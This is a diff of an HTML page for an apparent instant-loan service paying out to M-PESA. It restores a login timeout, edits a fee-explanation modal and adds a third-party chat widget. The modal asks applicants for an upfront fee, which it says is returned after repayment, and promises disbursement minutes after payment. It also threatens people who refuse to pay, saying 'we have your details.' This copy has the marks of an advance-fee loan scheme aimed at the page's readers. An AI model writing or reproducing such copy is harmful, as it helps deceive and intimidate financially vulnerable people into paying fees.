@@ -493,9 +493,9 @@ document.addEventListener('DOMContentLoaded', function () {
   const now = Date.now();
   const maxAge = 24 * 60 * 60 * 1000;
 
-  */if (!lastLogin || now - parseInt(lastLogin) > maxAge) {
+  if (!lastLogin || now - parseInt(lastLogin) > maxAge) {
     window.location.href = "login.html";
-  }/*
+  }
 
   firebase.auth().onAuthStateChanged(user => {
     if (!user) {
@@ -724,7 +724,7 @@ setTimeout(() => {
 <div class="modal-content">
 <h2 style="margin-bottom: 12px;">Why Do We Ask for Fees?</h2>
 <p style="font-size: 14px; color: #444;">
-      The fee covers loan processing, mobile disbursement charges, and verification services to ensure smooth and instant delivery of your funds to your M-PESA account.The fee will be returned back once the  loan is fully repayed.The fee also acts as a security and trust of your application.Ensure the provided number is correct and working,once fee is paid using the same phone number your loan will be disbursed in 1-3 MINS. NOTE:in future we will upgrade to a more secure way to disburse loans(Know your customer).❗️Those who refuse to pay loan will face charges since we have your details.GOOD LUCK.
+      The fee covers loan processing, mobile disbursement charges, and verification services to ensure smooth and instant delivery of your funds to your M-PESA account.The fee will be returned back once the  loan is fully repayed.The fee also acts as a security and trust of your application.Ensure the provided number is correct and working,once fee is paid using the same phone number your loan will be disbursed in 1-3 MINS. NOTE:in future we will upgrade to a more secure way to disburse loans(Know your customer).❗️Those who refuse to pay loan will face charges since we have your details..
     </p>
 <div class="modal-actions" style="margin-top: 20px;">
 <button class="btn-modal yellow" id="closeFeeExplanation">Got it</button>
@@ -792,4 +792,18 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 });
 </script>
+<!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
 </body></html>
